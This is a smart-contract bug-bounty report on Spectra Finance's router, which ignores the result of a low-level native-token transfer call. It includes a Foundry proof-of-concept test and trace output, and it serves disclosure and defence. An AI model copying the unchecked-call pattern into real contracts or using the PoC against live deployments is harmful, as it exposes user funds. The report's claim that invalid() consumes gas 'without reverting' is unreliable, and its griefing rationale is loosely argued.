# #44101 \[SC-Low] \`\_dispatch()\` incorrectly assumes revert bubbling when transferring native tokens.

**Submitted on Apr 16th 2025 at 22:02:25 UTC by @adrianx for** [**Audit Comp | Spectra Finance**](https://immunefi.com/audit-competition/audit-comp-spectra-finance)

* **Report ID:** #44101
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/Spectra-Audit-Competition/blob/main/src/router/Dispatcher.sol>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

`_dispatch()` incorrectly assumes revert bubbling when transferring native tokens.

## Vulnerability Details

When a Native eth transfer is executed through `Router:: _dispatch(command, input);` the underlying function performing the call assumes that any exceptions will be bubbled up, but with call being a low level rather than a Solidity function, it is not the case.

As seen below, there is an Incorrect assumption that reverts would bubble: In the Dispatcher.

<https://github.com/immunefi-team/Spectra-Audit-Competition/blob/1cebdc67a9276fd87105d13f302fd77d000d0c0b/src/router/Dispatcher.sol#L485>

```solidity
        else if (command == Commands.TRANSFER_NATIVE) {
            (address recipient, uint256 amount) = abi.decode(_inputs, (address, uint256));
            (bool success, ) = payable(recipient).call{value: amount}("");
        }
```

But as outlined in Solidity by Example - call <https://solidity-by-example.org/call/>.

```
call is a low level function to interact with other contracts.


This is the recommended method to use when you're just sending Ether via calling the fallback function.


However, it is not the recommended way to call existing functions.

Few reasons why low-level call is not recommended


    Reverts are not bubbled up

    Type checks are bypassed

    Function existence checks are omitted

```

## Impact Details

Griefing attacks. The incorrect assumption allows attackers to perform griefing attacks. Attackers can execute Failed native token transfers as though it was successful.

## References

<https://github.com/immunefi-team/Spectra-Audit-Competition/blob/1cebdc67a9276fd87105d13f302fd77d000d0c0b/src/router/Dispatcher.sol#L485>

## Proof of Concept

## Proof of Concept

Add the following code to RouterTest.T.sol and run with `forge test --mt testTransFerNative -vvvv`. check the logs to see the expected results.

```solidity
contract FailingContract {
    // Fallback function that consumes all gas but does not revert
    fallback() external payable {
        assembly {
            invalid() // Consumes all gas without reverting
        }
    }
}

contract ContractRouterTest is RouterBaseTest {
    FailingContract public FaContract;

    function setUp() public override {
        super.setUp();
        FaContract = new FailingContract();

        underlying.mint(testUser, FAUCET_AMOUNT * 3);
        ibt.deposit(FAUCET_AMOUNT * 2, testUser);

        ibt.approve(address(spectra4626Wrapper), FAUCET_AMOUNT);
        spectra4626Wrapper.wrap(FAUCET_AMOUNT, testUser);

    }

    function testTransFerNative() public {
        address payable sender = payable(address(this));
        address payable recipient = payable(address(FaContract));

        // Get rid of residues
        uint256 senderBalance = IERC20(WETH_WRAPPER_ADDRESS).balanceOf(sender);
        if (senderBalance > 0) {
            IERC20(WETH_WRAPPER_ADDRESS).approve(address(0), senderBalance);
            IERC20(WETH_WRAPPER_ADDRESS).transferFrom(sender, address(0), senderBalance);
        }

        // Send native to router contract
        vm.deal(sender, 1 ether);
        uint256 amount = 1 ether;
        uint256 nativeBalanceBefore = sender.balance;
        vm.prank(sender);
        payable(address(router)).call{value: amount}("");

        // Build the router execution for deposit
        bytes memory commands = abi.encodePacked(
            bytes1(uint8(Commands.DEPOSIT_NATIVE_IN_WRAPPER)),
            bytes1(uint8(Commands.TRANSFER))
        );

        bytes[] memory inputs = new bytes[](2);
        inputs[0] = abi.encode(WETH_WRAPPER_ADDRESS, 1 ether);
        inputs[1] = abi.encode(WETH_WRAPPER_ADDRESS, sender, 1 ether);

        // execute the commands
        router.execute(commands, inputs);

        senderBalance = IERC20(WETH_WRAPPER_ADDRESS).balanceOf(sender);
        assertEq(senderBalance, 1 ether, "Wrapped native balance is wrong");

        // Build the router execution for withdraw
        commands = abi.encodePacked(
            bytes1(uint8(Commands.TRANSFER_FROM)),
            bytes1(uint8(Commands.WITHDRAW_NATIVE_FROM_WRAPPER)),
            bytes1(uint8(Commands.TRANSFER_NATIVE))
        );

        inputs = new bytes[](3);
        inputs[0] = abi.encode(WETH_WRAPPER_ADDRESS, senderBalance);
        inputs[1] = abi.encode(WETH_WRAPPER_ADDRESS, senderBalance);
        inputs[2] = abi.encode(recipient, senderBalance);

        // execute the withdrawal
        // This execution will pass as though the native transfer was successful.
        // Because the contract incorrectly assumes revert bubbling.
        vm.prank(sender);
        IERC20(WETH_WRAPPER_ADDRESS).approve(address(router), senderBalance);
        router.execute(commands, inputs);
    }
}
```

logs:

The contract will incorrectly assume revert bubbling and executes the transfer as though it was successful.

```
    │   │   │   │   ├─ [55] Router::receive{value: 1000000000000000000}() [delegatecall]
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Return]
    │   │   │   ├─ emit Withdrawal(src: AMTransparentUpgradeableProxy: [0x978e3286EB805934215a88694d80b09aDed68D90], wad: 1000000000000000000 [1e18])
    │   │   │   └─ ← [Stop]
    │   │   ├─ [18] FailingContract::fallback{value: 1000000000000000000}()
    │   │   │   └─ ← [InvalidFEOpcode] EvmError: InvalidFEOpcode
    │   │   └─ ← [Stop]
    │   └─ ← [Return]
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 87.06s (29.10s CPU time)
```
